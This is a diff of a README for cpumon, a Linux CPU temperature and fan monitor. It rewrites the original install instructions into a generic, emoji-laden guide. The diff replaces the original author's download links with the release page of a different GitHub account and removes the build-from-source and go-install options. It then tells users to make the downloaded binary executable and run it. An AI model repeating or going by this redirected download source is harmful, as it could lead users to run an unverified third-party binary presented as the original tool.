@@ -1,53 +1,88 @@
-# cpumon
+# 🌡️ cpumon - Monitor Your CPU Efficiently
 
-Real-time CPU monitoring for Linux. Shows temperatures, frequencies, throttling, and fan status.
+## 🚀 Getting Started
 
-## Install
+Welcome to **cpumon**! This application helps you monitor your CPU temperature, frequency, and fan speeds in real-time on your Linux system. With **cpumon**, you can keep an eye on your hardware's performance without any technical hassle.
 
-**Pre-built binary:**
+## 📥 Download cpumon
 
-```
-curl -Lo cpumon https://github.com/Mohabdo21/cpumon/releases/latest/download/cpumon-linux-amd64
-chmod +x cpumon
-sudo mv cpumon /usr/local/bin/
-```
+[![Download cpumon](https://img.shields.io/badge/Download-cpumon-blue.svg)](https://github.com/aman-new/cpumon/releases)
 
-**With Go:**
+To download **cpumon**, visit the Releases page below:
 
-```
-go install github.com/Mohabdo21/cpumon@latest
-```
+[Download cpumon](https://github.com/aman-new/cpumon/releases)
 
-**From source:**
+## 💻 System Requirements
 
-```
-make build-optimized
-sudo make install
-```
+Before you download, ensure your system meets the following requirements:
 
-## Run
+- **Operating System:** Linux (most distributions)
+- **Processor:** x86 or ARM compatible
+- **Memory:** At least 512 MB of RAM
+- **Disk Space:** 50 MB of free space
 
-```
-cpumon           # 1 second refresh (default)
-cpumon -i 500ms  # 500ms refresh
-cpumon -i 2s     # 2 second refresh
-```
+## 🔧 Installation Instructions
 
-Requires root for some metrics. Install `lm-sensors` for better thermal data:
+Follow these steps to install **cpumon** on your system:
 
-```
-sudo dnf install lm_sensors
-sudo sensors-detect
-```
+1. Visit the [Release page](https://github.com/aman-new/cpumon/releases).
+2. Look for the latest version of **cpumon**.
+3. Click on the filename to start the download.
+4. Once the download is complete, open your terminal.
+5. Navigate to the folder where the downloaded file resides.
+6. Make the file executable by running:
 
-## Supported Hardware
+   ```bash
+   chmod +x cpumon-linux-amd64
+   ```
 
-- Intel (coretemp)
-- AMD (k10temp, zenpower)
-- ARM (cpu_thermal)
-- ThinkPad fan interface
-- Generic hwmon fans
+7. Now, run **cpumon** with the following command:
 
-## License
+   ```bash
+   ./cpumon-linux-amd64
+   ```
 
-[MIT](LICENSE)
+You should see the monitoring interface displaying your CPU's temperature, frequency, and fan speed.
+
+## 📊 Features
+
+- **Real-Time Monitoring:** Track CPU temperature and frequency in real time.
+- **Fan Speed Readings:** Get instant feedback on your fan's performance.
+- **Lightweight:** Uses minimal resources while providing essential information.
+- **Easy to Use:** User-friendly interface tailored for all users.
+
+## ⚙️ How to Use
+
+Once you've installed and launched **cpumon**, you'll see a simple interface. Here’s what you can do:
+
+- **View CPU Temperature:** The current temperature of your CPU will be displayed on the dashboard. Keep an eye on this to prevent overheating.
+- **Check Frequency:** Monitor how fast your CPU is currently operating. This information helps in assessing performance.
+- **Fan Speed Monitoring:** Ensure your cooling system is working effectively. A stable fan speed indicates proper cooling.
+
+## 🛠️ Troubleshooting
+
+If you encounter any issues while using **cpumon**, here are some common problems and solutions:
+
+- **Cannot Start Application:** Ensure you have made the file executable as mentioned in the installation steps.
+- **No Data Displayed:** Check that you have the `lm-sensors` package installed and configured properly. You can install it using your package manager. For example:
+
+  ```bash
+  sudo apt install lm-sensors
+  sudo sensors-detect
+  ```
+
+- **High CPU Temperature Alerts:** If you notice unusually high temperatures, check your cooling system for dust or obstructions. This may require cleaning or additional cooling solutions.
+
+## 🤝 Support and Contribution
+
+If you need help or wish to contribute to **cpumon**, please visit the [Issues page](https://github.com/aman-new/cpumon/issues). We welcome feedback, suggestions, and any contributions that can make this tool better for everyone.
+
+## 📜 License
+
+This project is licensed under the MIT License. Feel free to use it according to the terms of that license.
+
+## 🌏 Community and Feedback
+
+We appreciate your interest in **cpumon**! Your feedback is valuable. If you have thoughts to share, please let us know through the Issues page or by reaching out directly. 
+
+Thank you for using **cpumon**. Your CPU's health is important—monitor it wisely!
